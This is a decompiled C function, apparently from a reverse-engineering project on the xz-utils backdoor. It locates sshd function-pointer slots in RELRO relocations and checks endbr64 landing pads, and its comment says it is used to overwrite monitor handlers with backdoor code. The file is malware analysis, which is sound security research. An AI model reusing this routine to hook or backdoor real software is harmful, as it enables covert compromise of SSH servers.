// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_pointer.c
// Function: elf_find_function_pointer @ 0x102A50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_function_pointer(StringXrefId xref_id, void * * pOutCodeStart, void * * pOutCodeEnd, void * * pOutFptrAddr, elf_info_t * elf_info, string_references_t * xrefs, global_context_t * ctx)
/*
 * AutoDoc: Takes a string-reference catalogue entry, locates the associated RELRO slot, and checks CET landing requirements before returning the pointer. The loader relies on it to identify sshd callback tables—such as monitor handlers—that it will later overwrite with backdoor functions.
 */

#include "xzre_types.h"


BOOL elf_find_function_pointer
               (StringXrefId xref_id,void **pOutCodeStart,void **pOutCodeEnd,void **pOutFptrAddr,
               elf_info_t *elf_info,string_references_t *xrefs,global_context_t *ctx)

{
  void *pvVar1;
  BOOL BVar2;
  Elf64_Rela *pEVar3;
  Elf64_Relr *pEVar4;
  
  pvVar1 = xrefs->entries[xref_id].func_start;
  if (pvVar1 == (void *)0x0) {
    return 0;
  }
  *pOutCodeStart = pvVar1;
  *pOutCodeEnd = xrefs->entries[xref_id].func_end;
  pEVar3 = elf_find_rela_reloc(elf_info,(EncodedStringId)*pOutCodeStart,0);
  *pOutFptrAddr = pEVar3;
  if (pEVar3 == (Elf64_Rela *)0x0) {
    pEVar4 = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
    *pOutFptrAddr = pEVar4;
    if (pEVar4 == (Elf64_Relr *)0x0) {
      return 0;
    }
  }
  BVar2 = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
  if (BVar2 == 0) {
    return 0;
  }
  if (ctx->uses_endbr64 != 0) {
    BVar2 = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
    return (uint)(BVar2 != 0);
  }
  return 1;
}

